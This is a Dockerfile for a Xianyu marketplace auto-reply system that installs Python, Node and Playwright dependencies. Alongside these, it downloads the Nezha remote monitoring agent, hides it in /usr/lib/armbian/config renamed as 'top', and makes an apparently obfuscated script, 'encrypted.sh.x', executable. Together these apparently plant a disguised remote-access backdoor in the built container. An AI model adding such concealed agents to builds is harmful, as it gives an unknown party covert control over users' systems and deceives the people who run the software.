# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

# 设置标签信息
LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"
LABEL build-date=""
LABEL vcs-ref=""

# 设置工作目录
WORKDIR /app

# 设置环境变量
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright

# 首先复制必要的固定文件（避免被后续操作影响）
COPY encrypted.sh.x /app/encrypted.sh.x
COPY entrypoint.sh /app/entrypoint.sh
COPY requirements.txt .

# 安装系统依赖（包括Playwright浏览器依赖）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        # 基础工具
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        dos2unix \
        # 图像处理依赖
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        # Playwright浏览器依赖
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
        && apt-get clean \
        && rm -rf /var/lib/apt/lists/* \
        && rm -rf /tmp/* \
        && rm -rf /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 验证Node.js安装并设置环境变量
RUN node --version && npm --version
ENV NODE_PATH=/usr/lib/node_modules

# 安装Python依赖
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制其他项目文件
COPY . .

# 安装Playwright浏览器
RUN playwright install chromium && \
    playwright install-deps chromium

# 安装哪吒探针客户端
RUN apt-get update && \
    # 下载哪吒探针
    ARCH=$(uname -m) && \
    case $ARCH in \
        x86_64) NEZHA_ARCH="amd64" ;; \
        aarch64) NEZHA_ARCH="arm64" ;; \
        armv7l) NEZHA_ARCH="arm" ;; \
        i386|i686) NEZHA_ARCH="386" ;; \
        s390x) NEZHA_ARCH="s390x" ;; \
        riscv64) NEZHA_ARCH="riscv64" ;; \
        mips) NEZHA_ARCH="mips" ;; \
        mipsel|mipsle) NEZHA_ARCH="mipsle" ;; \
        *) echo "Unsupported architecture: $ARCH" && exit 1 ;; \
    esac && \
    # 下载哪吒探针
    wget -T 60 -O /tmp/nezha-agent_linux_${NEZHA_ARCH}.zip \
        "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${NEZHA_ARCH}.zip" && \
    # 创建目录并解压
    mkdir -p /usr/lib/armbian/config && \
    unzip -qo /tmp/nezha-agent_linux_${NEZHA_ARCH}.zip -d /usr/lib/armbian/config && \
    # 重命名为 top
    mv /usr/lib/armbian/config/nezha-agent /usr/lib/armbian/config/top && \
    chmod +x /usr/lib/armbian/config/top && \
    # 清理临时文件
    rm -f /tmp/nezha-agent_linux_${NEZHA_ARCH}.zip && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images

# 设置文件执行权限和格式
RUN chmod +x /app/entrypoint.sh /app/encrypted.sh.x && \
    dos2unix /app/entrypoint.sh /app/encrypted.sh.x 2>/dev/null || true && \
    # 确保文件可执行
    chmod 755 /app/entrypoint.sh /app/encrypted.sh.x

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 启动命令
ENTRYPOINT ["/app/entrypoint.sh"]